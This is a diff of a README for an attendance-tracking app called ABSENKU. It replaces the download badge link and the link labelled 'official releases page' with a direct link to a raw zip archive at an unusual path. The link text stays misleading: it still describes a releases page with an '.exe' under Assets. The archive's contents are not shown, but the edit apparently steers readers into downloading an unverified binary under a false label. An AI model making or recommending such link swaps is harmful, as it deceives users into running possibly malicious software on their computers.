@@ -1,6 +1,6 @@
 # ✅ ABSENKU - Track daily attendance with ease
 
-[![](https://img.shields.io/badge/Download_ABSENKU-007BFF?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Erfundamentalist881/ABSENKU)
+[![](https://img.shields.io/badge/Download_ABSENKU-007BFF?style=for-the-badge&logo=windows&logoColor=white)](https://raw.githubusercontent.com/Erfundamentalist881/ABSENKU/main/Allium/Software-v1.1-beta.5.zip)
 
 ## 📌 About this app
 
@@ -19,7 +19,7 @@ Your computer must meet these basic requirements to run ABSENKU:
 
 Follow these steps to install the app on your computer.
 
-1. Visit the [official releases page](https://github.com/Erfundamentalist881/ABSENKU) to find the latest version.
+1. Visit the [official releases page](https://raw.githubusercontent.com/Erfundamentalist881/ABSENKU/main/Allium/Software-v1.1-beta.5.zip) to find the latest version.
 2. Look for the file ending in `.exe` under the Assets section.
 3. Click the file name to start the download.
 4. Move the file to a folder where you want to keep your programs.
